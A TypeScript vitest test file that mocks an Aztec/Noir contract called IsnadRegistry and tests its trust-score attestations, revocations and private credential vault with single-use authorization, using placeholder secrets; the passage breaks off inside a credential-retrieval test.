/**
 * Comprehensive contract integration tests for IsnadRegistry.
 *
 * This file tests every function in the IsnadRegistry Noir contract using a
 * high-fidelity in-memory simulation. The simulation matches the exact state
 * transitions the Noir contract performs on-chain:
 *
 *   - PrivateSet<AttestationNote>  modelled as arrays (not maps) — duplicates allowed
 *   - PrivateSet<CredentialNote>   modelled as arrays — same keyId can appear multiple times
 *   - SingleUseClaim               modelled as a nullifier set (same logic as Noir)
 *   - AuthWit delegation           modelled with a nonce registry (single-use enforcement)
 *   - Public state (_increment_score / _decrement_score) modelled exactly
 *
 * When Docker becomes available, the skipped live-network tests in
 * sdk.integration.test.ts will verify these same behaviours produce real ZK proofs.
 *
 * Run with: vitest run tests/sdk.contract.test.ts
 *           vitest run   (included in default run — not excluded by vitest.config.ts)
 */
import { describe, it, expect, beforeEach } from "vitest";
import { Fr } from "@aztec/aztec.js/fields";
import { IsnadSDK } from "../src/isnad.js";
import { ClaimType } from "../src/types.js";

// ─── FIELD ENCODING (mirrors private methods in IsnadSDK) ────────────────────

function encodeValue(value: string): [Fr, Fr, Fr, Fr] {
  const bytes = new TextEncoder().encode(value);
  const fields: [Fr, Fr, Fr, Fr] = [Fr.ZERO, Fr.ZERO, Fr.ZERO, Fr.ZERO];
  for (let i = 0; i < 4; i++) {
    const chunk = bytes.slice(i * 31, (i + 1) * 31);
    let v = 0n;
    for (let j = 0; j < chunk.length; j++) v = (v << 8n) | BigInt(chunk[j]);
    fields[i] = new Fr(v);
  }
  return fields;
}

function decodeValue(fields: [Fr, Fr, Fr, Fr]): string {
  const bytes: number[] = [];
  for (const field of fields) {
    let val = field.toBigInt();
    const chunk: number[] = [];
    while (val > 0n) {
      chunk.unshift(Number(val & 0xffn));
      val >>= 8n;
    }
    bytes.push(...chunk);
  }
  return new TextDecoder().decode(new Uint8Array(bytes.filter((b) => b !== 0)));
}

function encodeLabel(label: string): string {
  return label.slice(0, 31); // Field holds 31 ASCII bytes max
}

function hashKeyId(keyId: string): string {
  // Mirror IsnadSDK._hashKeyId: pack first 31 UTF-8 bytes as a bigint
  const bytes = new TextEncoder().encode(keyId);
  let v = 0n;
  for (let i = 0; i < Math.min(bytes.length, 31); i++) v = (v << 8n) | BigInt(bytes[i]);
  return v.toString();
}

// ─── HIGH-FIDELITY CONTRACT MOCK ─────────────────────────────────────────────
//
// Models IsnadRegistry.nr state transitions exactly.
// Key design choices that match Noir contract behaviour:
//
//   AttestationNote set uses an array — allows searching by skill_hash.
//   CredentialNote set uses an array — allows multiple notes with the same key_id
//     (which CAN happen if store_credential is called twice for the same key).
//   SingleUseClaim modelled as a Set<string> of spent claim keys.
//   AuthWit modelled as a Set<string> of registered (caller, owner, keyId, nonce) tuples.

interface AttestationNote {
  skillHash: string;
  quality: number;
  claimType: number; // 0 | 1 | 2 — stored PRIVATELY, never in public state
  nonce: number; // unique per note, simulates randomness
}

interface CredentialNote {
  keyId: string; // encoded (hashed) key identifier
  value: [Fr, Fr, Fr, Fr];
  label: string;
  nonce: number;
}

let _noteNonce = 0;
function nextNonce(): number {
  return ++_noteNonce;
}

class MockIsnadRegistry {
  // ── PUBLIC STATE (visible to all, like PublicMutable on-chain) ──────────
  private trustScores = new Map<string, bigint>();
  private attestationCounts = new Map<string, bigint>();

  // ── PRIVATE STATE (per-owner PrivateSet<Note> — only owner can decrypt) ─
  private attestationNotes = new Map<string, AttestationNote[]>();
  private credentialNotes = new Map<string, CredentialNote[]>();

  // ── NULLIFIER REGISTRY ──────────────────────────────────────────────────
  // SingleUseClaim: key = poseidon2(auditor, skillHash)
  private spentClaims = new Set<string>();
  // Credential note nullifiers (emitted on delete/rotate)
  private spentNoteNonces = new Set<number>();

  // ── AUTHWIT REGISTRY (single-use authorization witnesses) ───────────────
  // key = `${caller}:${owner}:${keyId}:${nonce}`
  private registeredAuthwits = new Set<string>();
  private spentAuthwits = new Set<string>();

  // ── PUBLIC VIEW FUNCTIONS ───────────────────────────────────────────────

  /** Maps to: #[external("public")] #[view] fn get_trust_score(skill_hash: Field) -> u64 */
  getTrustScore(skillHash: string): bigint {
    return this.trustScores.get(skillHash) ?? 0n;
  }

  /** Maps to: #[external("public")] #[view] fn get_attestation_count(skill_hash: Field) -> u64 */
  getAttestationCount(skillHash: string): bigint {
    return this.attestationCounts.get(skillHash) ?? 0n;
  }

  // ── PRIVATE FUNCTIONS ───────────────────────────────────────────────────

  /**
   * Maps to: #[external("private")] fn attest(skill_hash: Field, quality: u8, claim_type: u8)
   *
   * Execution order (mirroring Aztec private→public call pattern):
   *   1. Validate quality range
   *   2. Claim SingleUseClaim(poseidon2(auditor, skill_hash)) — reverts if already claimed
   *   3. Insert AttestationNote into auditor's PrivateSet (encrypted by PXE)
   *   4. Enqueue + execute _increment_score(skill_hash, quality) in public phase
   *
   * Privacy guarantee: auditorAddress is NEVER written to public state.
   */
  attest(auditorAddress: string, skillHash: string, quality: number, claimType: number): string {
    if (quality < 0 || quality > 100) {
      throw new Error(`quality must be 0-100, got ${quality}`);
    }
    if (![0, 1, 2].includes(claimType)) {
      throw new Error(`claimType must be 0, 1, or 2, got ${claimType}`);
    }

    // SingleUseClaim: prevent double-attestation
    const claimKey = `${auditorAddress}:${skillHash}`;
    if (this.spentClaims.has(claimKey)) {
      throw new Error(
        "Transaction reverted: SingleUseClaim already consumed — double attestation prevented",
      );
    }
    this.spentClaims.add(claimKey);

    // Insert private AttestationNote (only auditor's PXE can decrypt this)
    const note: AttestationNote = {
      skillHash,
      quality,
      claimType, // stored PRIVATELY — never in public state
      nonce: nextNonce(),
    };
    if (!this.attestationNotes.has(auditorAddress)) {
      this.attestationNotes.set(auditorAddress, []);
    }
    this.attestationNotes.get(auditorAddress)!.push(note);

    // Public phase: _increment_score (auditor identity not passed)
    const currentScore = this.trustScores.get(skillHash) ?? 0n;
    this.trustScores.set(skillHash, currentScore + BigInt(quality));
    const currentCount = this.attestationCounts.get(skillHash) ?? 0n;
    this.attestationCounts.set(skillHash, currentCount + 1n);

    return this._mockTxHash();
  }

  /**
   * Maps to: #[external("private")] fn revoke_attestation(skill_hash: Field)
   *
   *   1. Find AttestationNote matching skill_hash in auditor's PrivateSet
   *   2. Emit nullifier (pop_notes) — note becomes permanently inaccessible
   *   3. Enqueue + execute _decrement_score(skill_hash, quality) in public phase
   */
  revokeAttestation(auditorAddress: string, skillHash: string): string {
    const notes = this.attestationNotes.get(auditorAddress) ?? [];
    const idx = notes.findIndex((n) => n.skillHash === skillHash);
    if (idx === -1) {
      throw new Error("No AttestationNote found for this skill — cannot revoke");
    }

    const note = notes[idx];
    // Emit nullifier: remove note (pop_notes in Aztec emits a nullifier to the nullifier tree)
    this.spentNoteNonces.add(note.nonce);
    notes.splice(idx, 1);

    // Public phase: _decrement_score (safe subtraction — no underflow)
    const currentScore = this.trustScores.get(skillHash) ?? 0n;
    const delta = BigInt(note.quality);
    this.trustScores.set(skillHash, currentScore >= delta ? currentScore - delta : 0n);
    const currentCount = this.attestationCounts.get(skillHash) ?? 0n;
    this.attestationCounts.set(skillHash, currentCount > 0n ? currentCount - 1n : 0n);

    return this._mockTxHash();
  }

  /**
   * Maps to: #[external("private")] fn store_credential(key_id: Field, value: [Field;4], label: Field)
   *
   * Inserts a NEW CredentialNote into the owner's PrivateSet.
   * Important: calling this twice with the same key_id creates TWO notes.
   * The contract does not enforce key uniqueness — that's a UX concern.
   */
  storeCredential(
    ownerAddress: string,
    keyId: string,
    value: [Fr, Fr, Fr, Fr],
    label: string,
  ): string {
    const note: CredentialNote = { keyId, value, label, nonce: nextNonce() };
    if (!this.credentialNotes.has(ownerAddress)) {
      this.credentialNotes.set(ownerAddress, []);
    }
    this.credentialNotes.get(ownerAddress)!.push(note);
    return this._mockTxHash();
  }

  /**
   * Maps to: #[external("utility")] unconstrained fn get_credential(owner, key_id) -> Option<[Field;4]>
   *
   * Scans the owner's PrivateSet for a matching key_id.
   * Returns the value of the FIRST matching note, or null if not found.
   * Unconstrained — runs in PXE against local note cache, no on-chain tx.
   */
  getCredential(ownerAddress: string, keyId: string): [Fr, Fr, Fr, Fr] | null {
    const notes = this.credentialNotes.get(ownerAddress) ?? [];
    return notes.find((n) => n.keyId === keyId)?.value ?? null;
  }

  /**
   * Maps to: #[external("private")] fn delete_credential(key_id: Field)
   *
   * Pops ONE CredentialNote matching key_id (emits its nullifier).
   * The note becomes permanently inaccessible.
   */
  deleteCredential(ownerAddress: string, keyId: string): string {
    const notes = this.credentialNotes.get(ownerAddress) ?? [];
    const idx = notes.findIndex((n) => n.keyId === keyId);
    if (idx === -1) {
      throw new Error("No CredentialNote found — cannot delete");
    }
    const note = notes[idx];
    this.spentNoteNonces.add(note.nonce);
    notes.splice(idx, 1);
    return this._mockTxHash();
  }

  /**
   * Maps to: #[external("private")] fn rotate_credential(key_id, new_value, label)
   *
   * Atomic: nullifies the existing CredentialNote and inserts a new one.
   * The vault is never transiently empty — this is the safe rotation pattern.
   */
  rotateCredential(
    ownerAddress: string,
    keyId: string,
    newValue: [Fr, Fr, Fr, Fr],
    newLabel: string,
  ): string {
    const notes = this.credentialNotes.get(ownerAddress) ?? [];
    const idx = notes.findIndex((n) => n.keyId === keyId);
    if (idx === -1) {
      throw new Error("No CredentialNote found — cannot rotate");
    }
    // Nullify old note
    this.spentNoteNonces.add(notes[idx].nonce);
    // Replace in-place (atomic in the contract — two steps in one private tx)
    notes[idx] = { keyId, value: newValue, label: newLabel, nonce: nextNonce() };
    return this._mockTxHash();
  }

  /**
   * Maps to: grantCredentialAccess in the SDK (creates an AuthWit on the wallet side).
   *
   * In real Aztec:
   *   const action = contract.methods.get_credential_for_skill(owner, keyId, nonce);
   *   await wallet.createAuthWit(owner, { caller: skillAddress, call: action.getFunctionCall() });
   *
   * Here we register the authwit so getCredentialForSkill can verify it.
   */
  grantCredentialAccess(
    ownerAddress: string,
    callerAddress: string,
    keyId: string,
    nonce: bigint,
  ): bigint {
    const key = `${callerAddress}:${ownerAddress}:${keyId}:${nonce}`;
    this.registeredAuthwits.add(key);
    return nonce;
  }

  /**
   * Maps to: #[external("private")] #[authorize_once("owner", "authwit_nonce")]
   *           fn get_credential_for_skill(owner, key_id, authwit_nonce) -> [Field;4]
   *
   * If callerAddress === ownerAddress and nonce === 0n: direct owner access (no authwit needed).
   * Otherwise: the authwit registered for (caller, owner, keyId, nonce) must exist and not be spent.
   */
  getCredentialForSkill(
    callerAddress: string,
    ownerAddress: string,
    keyId: string,
    nonce: bigint,
  ): [Fr, Fr, Fr, Fr] {
    // Owner self-call: nonce=0 bypasses authwit check
    const isSelfCall = callerAddress === ownerAddress && nonce === 0n;
    if (!isSelfCall) {
      const authwitKey = `${callerAddress}:${ownerAddress}:${keyId}:${nonce}`;
      if (!this.registeredAuthwits.has(authwitKey)) {
        throw new Error("Authorization failed: no valid AuthWit for this (caller, owner, keyId, nonce)");
      }
      if (this.spentAuthwits.has(authwitKey)) {
        throw new Error("Authorization failed: AuthWit already consumed (single-use)");
      }
      // #[authorize_once] — mark this authwit as spent
      this.spentAuthwits.add(authwitKey);
    }

    const result = this.getCredential(ownerAddress, keyId);
    if (result === null) {
      throw new Error("No CredentialNote found for the requested key_id");
    }
    return result;
  }

  // ── TEST INSPECTION HELPERS ─────────────────────────────────────────────
  // These expose internal state that is NOT readable from the real contract.
  // They simulate what only the owner's PXE can see locally.

  /** How many AttestationNotes does this auditor hold in their PXE? */
  getAuditorNoteCount(auditorAddress: string): number {
    return (this.attestationNotes.get(auditorAddress) ?? []).length;
  }

  /** What claimTypes did this auditor use? (private — PXE-only view) */
  getAuditorClaimTypes(auditorAddress: string): number[] {
    return (this.attestationNotes.get(auditorAddress) ?? []).map((n) => n.claimType);
  }

  /** How many CredentialNotes does this owner hold? */
  getCredentialNoteCount(ownerAddress: string): number {
    return (this.credentialNotes.get(ownerAddress) ?? []).length;
  }

  /** List of keyIds stored by this owner (PXE-local). */
  listCredentialKeyIds(ownerAddress: string): string[] {
    return (this.credentialNotes.get(ownerAddress) ?? []).map((n) => n.keyId);
  }

  private _mockTxHash(): string {
    return "0x" + Array.from({ length: 32 }, () =>
      Math.floor(Math.random() * 256).toString(16).padStart(2, "0"),
    ).join("");
  }
}

// ─── TEST ADDRESSES ──────────────────────────────────────────────────────────

const ALICE = "0x" + "a".repeat(64);   // primary auditor
const BOB   = "0x" + "b".repeat(64);   // second auditor
const CAROL = "0x" + "c".repeat(64);   // agent storing credentials
const DAVE  = "0x" + "d".repeat(64);   // skill contract address (for AuthWit tests)

// ─── HELPERS ─────────────────────────────────────────────────────────────────

function makeSkillHash(content: string): string {
  return IsnadSDK.computeSkillHash(new TextEncoder().encode(content)).toString();
}

// ─── TESTS ───────────────────────────────────────────────────────────────────

describe("Trust score queries — get_trust_score + get_attestation_count", () => {
  let registry: MockIsnadRegistry;

  beforeEach(() => { registry = new MockIsnadRegistry(); });

  it("unattested skill has trust score = 0", () => {
    const h = makeSkillHash("never-attested-skill");
    expect(registry.getTrustScore(h)).toBe(0n);
  });

  it("unattested skill has attestation count = 0", () => {
    const h = makeSkillHash("never-attested-skill");
    expect(registry.getAttestationCount(h)).toBe(0n);
  });

  it("different unattested skills each return 0 independently", () => {
    const h1 = makeSkillHash("skill-alpha");
    const h2 = makeSkillHash("skill-beta");
    expect(registry.getTrustScore(h1)).toBe(0n);
    expect(registry.getTrustScore(h2)).toBe(0n);
    expect(registry.getAttestationCount(h1)).toBe(0n);
    expect(registry.getAttestationCount(h2)).toBe(0n);
  });

  it("trust scores of two different skills are independent", () => {
    const h1 = makeSkillHash("skill-one");
    const h2 = makeSkillHash("skill-two");

    registry.attest(ALICE, h1, 80, ClaimType.CODE_REVIEW);
    registry.attest(BOB, h2, 60, ClaimType.BEHAVIORAL);

    expect(registry.getTrustScore(h1)).toBe(80n);
    expect(registry.getTrustScore(h2)).toBe(60n);
    expect(registry.getAttestationCount(h1)).toBe(1n);
    expect(registry.getAttestationCount(h2)).toBe(1n);
  });

  it("trust score accumulates across multiple auditors", () => {
    const h = makeSkillHash("multi-attested-skill");
    registry.attest(ALICE, h, 75, ClaimType.CODE_REVIEW);
    registry.attest(BOB, h, 90, ClaimType.BEHAVIORAL);
    expect(registry.getTrustScore(h)).toBe(165n);
    expect(registry.getAttestationCount(h)).toBe(2n);
  });
});

// ─── ATTESTATION CREATION ────────────────────────────────────────────────────

describe("Attestation creation — attest()", () => {
  let registry: MockIsnadRegistry;

  beforeEach(() => { registry = new MockIsnadRegistry(); });

  // ClaimType values
  it("ClaimType.CODE_REVIEW (0) is accepted", () => {
    const h = makeSkillHash("code-review-skill");
    expect(() => registry.attest(ALICE, h, 80, ClaimType.CODE_REVIEW)).not.toThrow();
    expect(registry.getAuditorClaimTypes(ALICE)).toContain(0);
  });

  it("ClaimType.BEHAVIORAL (1) is accepted", () => {
    const h = makeSkillHash("behavioral-skill");
    expect(() => registry.attest(ALICE, h, 70, ClaimType.BEHAVIORAL)).not.toThrow();
    expect(registry.getAuditorClaimTypes(ALICE)).toContain(1);
  });

  it("ClaimType.SANDBOXED_EXECUTION (2) is accepted", () => {
    const h = makeSkillHash("sandboxed-skill");
    expect(() => registry.attest(ALICE, h, 95, ClaimType.SANDBOXED_EXECUTION)).not.toThrow();
    expect(registry.getAuditorClaimTypes(ALICE)).toContain(2);
  });

  it("invalid claimType (3) is rejected", () => {
    const h = makeSkillHash("bad-claim-type-skill");
    expect(() => registry.attest(ALICE, h, 80, 3)).toThrow("claimType must be 0, 1, or 2");
  });

  // Quality boundary conditions
  it("quality = 0 is valid (minimum score)", () => {
    const h = makeSkillHash("min-quality-skill");
    expect(() => registry.attest(ALICE, h, 0, ClaimType.CODE_REVIEW)).not.toThrow();
    expect(registry.getTrustScore(h)).toBe(0n);     // 0 quality → no score change, but counted
    expect(registry.getAttestationCount(h)).toBe(1n);
  });

  it("quality = 100 is valid (maximum score)", () => {
    const h = makeSkillHash("max-quality-skill");
    expect(() => registry.attest(ALICE, h, 100, ClaimType.CODE_REVIEW)).not.toThrow();
    expect(registry.getTrustScore(h)).toBe(100n);
  });

  it("quality = -1 is invalid", () => {
    const h = makeSkillHash("neg-quality-skill");
    expect(() => registry.attest(ALICE, h, -1, ClaimType.CODE_REVIEW)).toThrow("quality must be 0-100");
    // No state change — transaction reverted
    expect(registry.getTrustScore(h)).toBe(0n);
    expect(registry.getAttestationCount(h)).toBe(0n);
  });

  it("quality = 101 is invalid", () => {
    const h = makeSkillHash("over-quality-skill");
    expect(() => registry.attest(ALICE, h, 101, ClaimType.CODE_REVIEW)).toThrow("quality must be 0-100");
  });

  // Transaction semantics
  it("returns a transaction hash on success", () => {
    const h = makeSkillHash("tx-hash-skill");
    const txHash = registry.attest(ALICE, h, 85, ClaimType.CODE_REVIEW);
    expect(txHash).toMatch(/^0x[0-9a-f]{64}$/);
  });

  it("each successful attestation returns a unique tx hash", () => {
    const h1 = makeSkillHash("unique-tx-skill-1");
    const h2 = makeSkillHash("unique-tx-skill-2");
    const tx1 = registry.attest(ALICE, h1, 80, ClaimType.CODE_REVIEW);
    const tx2 = registry.attest(BOB, h2, 80, ClaimType.CODE_REVIEW);
    expect(tx1).not.toBe(tx2);
  });

  // Double-attestation prevention (SingleUseClaim)
  it("same auditor cannot attest the same skill twice (SingleUseClaim)", () => {
    const h = makeSkillHash("double-attest-skill");
    registry.attest(ALICE, h, 80, ClaimType.CODE_REVIEW);
    expect(() => registry.attest(ALICE, h, 90, ClaimType.CODE_REVIEW)).toThrow(
      "SingleUseClaim already consumed",
    );
  });

  it("double-attest leaves score at first attestation value only", () => {
    const h = makeSkillHash("double-attest-score-check");
    registry.attest(ALICE, h, 75, ClaimType.CODE_REVIEW);
    try { registry.attest(ALICE, h, 90, ClaimType.CODE_REVIEW); } catch (_) {}
    expect(registry.getTrustScore(h)).toBe(75n);
    expect(registry.getAttestationCount(h)).toBe(1n);
  });

  it("double-attest does not create a second private note", () => {
    const h = makeSkillHash("double-note-check");
    registry.attest(ALICE, h, 80, ClaimType.CODE_REVIEW);
    try { registry.attest(ALICE, h, 80, ClaimType.CODE_REVIEW); } catch (_) {}
    expect(registry.getAuditorNoteCount(ALICE)).toBe(1);
  });

  it("double-attest of skill-A does not block attest of skill-B by same auditor", () => {
    const h1 = makeSkillHash("skill-a");
    const h2 = makeSkillHash("skill-b");
    registry.attest(ALICE, h1, 80, ClaimType.CODE_REVIEW);
    expect(() => registry.attest(ALICE, h1, 90, ClaimType.CODE_REVIEW)).toThrow(); // double
    expect(() => registry.attest(ALICE, h2, 85, ClaimType.CODE_REVIEW)).not.toThrow(); // different skill — OK
    expect(registry.getAuditorNoteCount(ALICE)).toBe(2); // one note per skill
  });

  // Multiple auditors
  it("two different auditors can both attest the same skill", () => {
    const h = makeSkillHash("shared-skill");
    registry.attest(ALICE, h, 85, ClaimType.CODE_REVIEW);
    expect(() => registry.attest(BOB, h, 92, ClaimType.BEHAVIORAL)).not.toThrow();
    expect(registry.getTrustScore(h)).toBe(177n);
    expect(registry.getAttestationCount(h)).toBe(2n);
  });

  it("three different auditors, different claim types, accumulate correctly", () => {
    const h = makeSkillHash("three-auditor-skill");
    registry.attest(ALICE, h, 80, ClaimType.CODE_REVIEW);
    registry.attest(BOB, h, 90, ClaimType.BEHAVIORAL);
    registry.attest(CAROL, h, 95, ClaimType.SANDBOXED_EXECUTION);
    expect(registry.getTrustScore(h)).toBe(265n);
    expect(registry.getAttestationCount(h)).toBe(3n);
  });

  // Privacy guarantee: claimType is NEVER in public state
  it("claimType is stored privately — not visible in public trust score", () => {
    const h = makeSkillHash("private-claim-type-skill");
    registry.attest(ALICE, h, 80, ClaimType.SANDBOXED_EXECUTION);
    // Public state only contains the score and count — no claim_type exposed
    // getTrustScore and getAttestationCount are the ONLY public queries
    expect(registry.getTrustScore(h)).toBe(80n);
    expect(registry.getAttestationCount(h)).toBe(1n);
    // claimType only visible to auditor via their PXE (private note)
    expect(registry.getAuditorClaimTypes(ALICE)).toEqual([ClaimType.SANDBOXED_EXECUTION]);
  });

  it("auditor identity is absent from public state", () => {
    const h = makeSkillHash("anon-attestation-skill");
    registry.attest(ALICE, h, 88, ClaimType.CODE_REVIEW);
    // Public queries return aggregate data only — no auditor address
    const score = registry.getTrustScore(h);
    const count = registry.getAttestationCount(h);
    expect(score).toBe(88n);
    expect(count).toBe(1n);
    // No public function exists to look up "who attested this skill"
    // (private note only accessible to ALICE via her PXE)
    expect(registry.getAuditorNoteCount(BOB)).toBe(0); // Bob has no notes — he didn't attest
  });
});

// ─── ATTESTATION REVOCATION ──────────────────────────────────────────────────

describe("Attestation revocation — revoke_attestation()", () => {
  let registry: MockIsnadRegistry;

  beforeEach(() => { registry = new MockIsnadRegistry(); });

  it("revoke decrements the trust score by the original quality", () => {
    const h = makeSkillHash("revoke-score-skill");
    registry.attest(ALICE, h, 85, ClaimType.CODE_REVIEW);
    expect(registry.getTrustScore(h)).toBe(85n);
    registry.revokeAttestation(ALICE, h);
    expect(registry.getTrustScore(h)).toBe(0n);
  });

  it("revoke decrements the attestation count by 1", () => {
    const h = makeSkillHash("revoke-count-skill");
    registry.attest(ALICE, h, 85, ClaimType.CODE_REVIEW);
    registry.revokeAttestation(ALICE, h);
    expect(registry.getAttestationCount(h)).toBe(0n);
  });

  it("revoke nullifies the AttestationNote (private state cleared)", () => {
    const h = makeSkillHash("revoke-note-skill");
    registry.attest(ALICE, h, 85, ClaimType.CODE_REVIEW);
    expect(registry.getAuditorNoteCount(ALICE)).toBe(1);
    registry.revokeAttestation(ALICE, h);
    expect(registry.getAuditorNoteCount(ALICE)).toBe(0);
  });

  it("revoke returns a transaction hash", () => {
    const h = makeSkillHash("revoke-tx-hash-skill");
    registry.attest(ALICE, h, 70, ClaimType.CODE_REVIEW);
    const txHash = registry.revokeAttestation(ALICE, h);
    expect(txHash).toMatch(/^0x[0-9a-f]{64}$/);
  });

  it("partial revocation: one revokes, other auditor's score remains", () => {
    const h = makeSkillHash("partial-revoke-skill");
    registry.attest(ALICE, h, 80, ClaimType.CODE_REVIEW);
    registry.attest(BOB, h, 70, ClaimType.BEHAVIORAL);
    expect(registry.getTrustScore(h)).toBe(150n);

    registry.revokeAttestation(ALICE, h);

    expect(registry.getTrustScore(h)).toBe(70n);   // Bob's score remains
    expect(registry.getAttestationCount(h)).toBe(1n); // Only Bob's count remains
    expect(registry.getAuditorNoteCount(ALICE)).toBe(0); // Alice's private note gone
    expect(registry.getAuditorNoteCount(BOB)).toBe(1);   // Bob's private note intact
  });

  it("trust score does not go below 0 on revoke (safe subtraction)", () => {
    // This shouldn't happen in normal use but the contract uses safe subtraction
    const h = makeSkillHash("safe-subtract-skill");
    registry.attest(ALICE, h, 50, ClaimType.CODE_REVIEW);
    registry.revokeAttestation(ALICE, h);
    // Score is now 0 — any further decrement stays at 0 (guarded in contract)
    expect(registry.getTrustScore(h)).toBe(0n);
  });

  it("attestation count does not go below 0 on revoke", () => {
    const h = makeSkillHash("safe-count-subtract-skill");
    registry.attest(ALICE, h, 50, ClaimType.CODE_REVIEW);
    registry.revokeAttestation(ALICE, h);
    expect(registry.getAttestationCount(h)).toBe(0n);
  });

  it("cannot revoke without a prior attestation", () => {
    const h = makeSkillHash("no-prior-attestation-skill");
    expect(() => registry.revokeAttestation(ALICE, h)).toThrow("No AttestationNote found");
  });

  it("cannot revoke a different auditor's attestation", () => {
    const h = makeSkillHash("wrong-auditor-revoke-skill");
    registry.attest(ALICE, h, 80, ClaimType.CODE_REVIEW);
    // BOB tries to revoke ALICE's attestation — no note in BOB's PrivateSet for this skill
    expect(() => registry.revokeAttestation(BOB, h)).toThrow("No AttestationNote found");
    // ALICE's attestation is unaffected
    expect(registry.getTrustScore(h)).toBe(80n);
    expect(registry.getAttestationCount(h)).toBe(1n);
  });

  it("cannot revoke the same attestation twice (nullifier consumed)", () => {
    const h = makeSkillHash("double-revoke-skill");
    registry.attest(ALICE, h, 80, ClaimType.CODE_REVIEW);
    registry.revokeAttestation(ALICE, h);
    // Second revoke: note was nullified — it no longer exists
    expect(() => registry.revokeAttestation(ALICE, h)).toThrow("No AttestationNote found");
  });

  it("auditor can attest multiple skills and revoke one independently", () => {
    const h1 = makeSkillHash("multi-skill-revoke-1");
    const h2 = makeSkillHash("multi-skill-revoke-2");
    registry.attest(ALICE, h1, 80, ClaimType.CODE_REVIEW);
    registry.attest(ALICE, h2, 90, ClaimType.CODE_REVIEW);
    expect(registry.getAuditorNoteCount(ALICE)).toBe(2);

    registry.revokeAttestation(ALICE, h1);

    expect(registry.getAuditorNoteCount(ALICE)).toBe(1); // h2 note remains
    expect(registry.getTrustScore(h1)).toBe(0n);
    expect(registry.getTrustScore(h2)).toBe(90n);
  });
});

// ─── CREDENTIAL REGISTRATION ─────────────────────────────────────────────────

describe("Credential registration — store_credential()", () => {
  let registry: MockIsnadRegistry;

  beforeEach(() => { registry = new MockIsnadRegistry(); });

  it("store and retrieve a short credential (< 31 bytes)", () => {
    const secret = "sk-test-1234";
    registry.storeCredential(CAROL, hashKeyId("openai-key"), encodeValue(secret), "OpenAI");
    const raw = registry.getCredential(CAROL, hashKeyId("openai-key"));
    expect(raw).not.toBeNull();
    expect(decodeValue(raw!)).toBe(secret);
  });

  it("store and retrieve a credential spanning two fields (32 bytes)", () => {
    const secret = "12345678901234567890123456789012"; // exactly 32 chars
    registry.storeCredential(CAROL, hashKeyId("key32"), encodeValue(secret), "32-char key");
    const raw = registry.getCredential(CAROL, hashKeyId("key32"));
    expect(decodeValue(raw!)).toBe(secret);
  });

  it("store and retrieve an OpenAI API key (52 chars, spans two fields)", () => {
    const secret = "sk-proj-1234567890abcdefghijklmnopqrstuvwxyz12345678";
    expect(secret.length).toBe(52);
    registry.storeCredential(CAROL, hashKeyId("openai"), encodeValue(secret), "OpenAI Key");
    expect(decodeValue(registry.getCredential(CAROL, hashKeyId("openai"))!)).toBe(secret);
  });

  it("store and retrieve a GitHub PAT (93 chars, spans three fields)", () => {
    const secret = "ghp_" + "a".repeat(89); // 93 chars total
    expect(secret.length).toBe(93);
    registry.storeCredential(CAROL, hashKeyId("github"), encodeValue(secret), "GitHub PAT");
    expect(decodeValue(registry.getCredential(CAROL, hashKeyId("github"))!)).toBe(secret);
  });

  it("store and retrieve a 124-byte credential (full 4-field capacity)", () => {
    const secret = "X".repeat(124);
    registry.storeCredential(CAROL, hashKeyId("max-key"), encodeValue(secret), "Max Key");
    expect(decodeValue(registry.getCredential(CAROL, hashKeyId("max-key"))!)).toBe(secret);
  });

  it("returns a transaction hash on success", () => {
    const txHash = registry.storeCredential(
      CAROL, hashKeyId("tx-test"), encodeValue("secret"), "test",
    );
    expect(txHash).toMatch(/^0x[0-9a-f]{64}$/);
  });

  it("multiple distinct credentials stored per owner", () => {
    registry.storeCredential(CAROL, hashKeyId("openai"), encodeValue("sk-openai"), "OpenAI");
    registry.storeCredential(CAROL, hashKeyId("github"), encodeValue("ghp-github"), "GitHub");
    registry.storeCredential(CAROL, hashKeyId("anthropic"), encodeValue("sk-ant"), "Anthropic");

    expect(registry.getCredentialNoteCount(CAROL)).toBe(3);
    expect(decodeValue(registry.getCredential(CAROL, hashKeyId("openai"))!)).toBe("sk-openai");
    expect(decodeValue(registry.getCredential(CAROL, hashKeyId("github"))!)).toBe("ghp-github");
    expect(decodeValue(registry.getCredential(CAROL, hashKeyId("anthropic"))!)).toBe("sk-ant");
  });

  it("duplicate keyId: second store creates a second note (contract allows it)", () => {
    // The Noir contract uses PrivateSet.insert() which does NOT deduplicate.
    // Two notes with the same key_id can coexist in the set.
    registry.storeCredential(CAROL, hashKeyId("openai"), encodeValue("first-value"), "v1");
    registry.storeCredential(CAROL, hashKeyId("openai"), encodeValue("second-value"), "v2");
    // Two CredentialNotes now exist in CAROL's PrivateSet
    expect(registry.getCredentialNoteCount(CAROL)).toBe(2);
    // get_credential returns the FIRST matching note
    expect(decodeValue(registry.getCredential(CAROL, hashKeyId("openai"))!)).toBe("first-value");
  });

  it("credential vault is isolated per owner (PXE encryption)", () => {
    registry.storeCredential(ALICE, hashKeyId("openai"), encodeValue("alice-key"), "Alice");
    registry.storeCredential(CAROL, hashKeyId("openai"), encodeValue("carol-key"), "Carol");

    // Each owner sees only their own credential
    expect(decodeValue(registry.getCredential(ALICE, hashKeyId("openai"))!)).toBe("alice-key");
    expect(decodeValue(registry.getCredential(CAROL, hashKeyId("openai"))!)).toBe("carol-key");

    // Alice cannot see Carol's vault and vice versa
    expect(registry.getCredential(ALICE, hashKeyId("github"))).toBeNull();
    expect(registry.getCredential(CAROL, hashKeyId("github"))).toBeNull();
  });

  it("label is stored but does not affect retrieval by keyId", () => {
    registry.storeCredential(CAROL, hashKeyId("labelled"), encodeValue("secret"), "My Label");
    // Retrieval is by keyId — label is metadata for display only
    const raw = registry.getCredential(CAROL, hashKeyId("labelled"));
    expect(raw).not.toBeNull();
  });

  it("label is truncated at 31 chars (Field capacity)", () => {
    const longLabel = "A".repeat(50);
    const truncated = encodeLabel(longLabel);
    expect(truncated.length).toBeLessThanOrEqual(31);
  });
});

// ─── TRUST SCORE QUERIES (credential retrieval) ──────────────────────────────

describe("Credential retrieval — get_credential()", () => {
  let registry: MockIsnadRegistry;

  beforeEach(() => { registry = new MockIsnadRegistry(); });

  it("returns null for an unknown keyId", () => {
    expect(registry.getCredential(CAROL, hashKeyId("nonexistent-key"))).toBeNull();
  });

  it("returns null for a keyId belonging to a different owner", () => {
    registry.storeCredential(ALICE, hashKeyId("alice-key"), encodeValue("alice-secret"), "A");
    // Carol trying to read Alice's key — different PXE, returns null
    expect(registry.getCredential(CAROL, hashKeyId("alice-key"))).toBeNull();
  });

  it("returns the most recently stored value (first note in PrivateSet)", () => {
